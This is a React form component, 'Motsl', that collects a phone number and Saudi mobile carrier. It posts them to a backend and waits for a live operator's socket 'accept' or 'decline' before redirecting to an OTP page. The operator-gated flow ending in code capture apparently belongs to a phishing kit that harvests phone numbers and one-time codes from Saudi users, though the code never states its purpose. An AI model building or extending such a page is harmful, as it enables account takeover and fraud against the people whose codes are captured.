import axios from "axios";
import React, { useState } from "react";
import { api_route, socket } from "../App";
import { TailSpin } from "react-loader-spinner";
import { useNavigate } from "react-router-dom";
import { useTranslation } from "../context/LanguageContext";

const Motsl = () => {
  const { t, dir } = useTranslation();
  const [phone, setPhone] = useState(null);
  const [network, setNetwork] = useState(null);
  const [load, setLoad] = useState(false);
  const [error, setError] = useState(false);
  const query = new URLSearchParams(window.location.search);
  const id = query.get("id");
  const navigate = useNavigate();
  const handleSubmit = async (e) => {
    setLoad(true);
    e.preventDefault();
    if (!network) {
      setLoad(false);
      return window.alert(t("motsl.selectNetworkAlert"));
    } else {
      try {
        await axios
          .post(api_route + "/motsl/" + id, {
            MotslPhone: phone,
            MotslNetwork: network,
          })
          .then(() => socket.emit("motsl", id));
      } catch (error) {}
    }
  };

  socket.on("acceptMotsl", (data) => {
    if (data === id) {
      setLoad(false);
      setError(false);
      navigate(
        `/motslOtp?data=${JSON.stringify({
          phone,
          network,
          id,
        })}`
      );
    }
  });

  socket.on("declineMotsl", (data) => {
    if (data === id) {
      setLoad(false);
      setError(true);
    }
  });

  return (
    <div className="w-full flex flex-col items-center justify-center  relative gap-y-5">
      {load ? (
        <div className="flex top-0 z-50 w-full justify-center items-center h-screen fixed bg-white bg-opacity-60">
          <div className="bg-white rounded-md p-3 w-fit h-fit flex items-center justify-center gap-x-3">
            <TailSpin
              height="30"
              width="30"
              color="gray"
              ariaLabel="tail-spin-loading"
              radius="1"
              wrapperStyle={{}}
              wrapperClass=""
              visible={true}
            />
            <span className="text-lg">{t("common.processing")}</span>
            <img src="/logo.svg" className="w-14 h-14" />
          </div>
        </div>
      ) : (
        ""
      )}
      <form
        onSubmit={handleSubmit}
        className="w-full border rounded-md mx-1   py-5 px-4 shadow-md my-2 h-fit "
        dir={dir}
      >
        <span className="text-lg font-bold">{t("motsl.title")}</span>
        <div className="flex w-full items-center  flex-col my-2   " dir={dir}>
          <span className="w-full text-right text-gray-700 text-base">
            {t("motsl.successMessage")}
          </span>
          <span className="w-full text-right text-gray-700 text-sm">
            {t("motsl.continuePrompt")}
          </span>
        </div>

        <div className="flex flex-col gap-y-2 items-center">
          <span className=" text-base w-full text-right  font-bold text-gray-600">
            {t("motsl.mobileLabel")}
          </span>
          <input
            required
            type="text"
            minLength={10}
            maxLength={10}
            value={phone}
            inputMode="numeric"
            dir="ltr"
            onChange={(e) => setPhone(e.target.value)}
            placeholder="**********"
            className="p-2 border-2 text-left w-full rounded-md outline-blue-500"
          />
        </div>
        <div className="flex flex-col gap-y-2 items-center my-2">
          <span className=" text-base w-full text-right  font-bold text-gray-600">
            {t("motsl.networkLabel")}
          </span>
          <select
            required
            value={network}
            inputMode="numeric"
            onChange={(e) => setNetwork(e.target.value)}
            className="p-2 border-2 text-left w-full rounded-md outline-blue-500"
          >
            <option>{t("motsl.selectNetwork")}</option>
            <option>Zain</option>
            <option>Mobily</option>
            <option>STC</option>
            <option>Salam</option>
            <option>Virgin</option>
            <option>Redbull</option>
          </select>
        </div>
        {error ? (
          <div className="w-full text-center text-red-500 text-xl">
            {t("common.invalidCredentials")}
          </div>
        ) : (
          ""
        )}
        <div className="w-full flex justify-center items-center">
          <button
            className="text-white bg-[#146394] w-11/12 text-lg py-2  mt-5 rounded-md "
            type="submit"
          >
            {t("common.confirm")}
          </button>
        </div>
      </form>
    </div>
  );
};

export default Motsl;
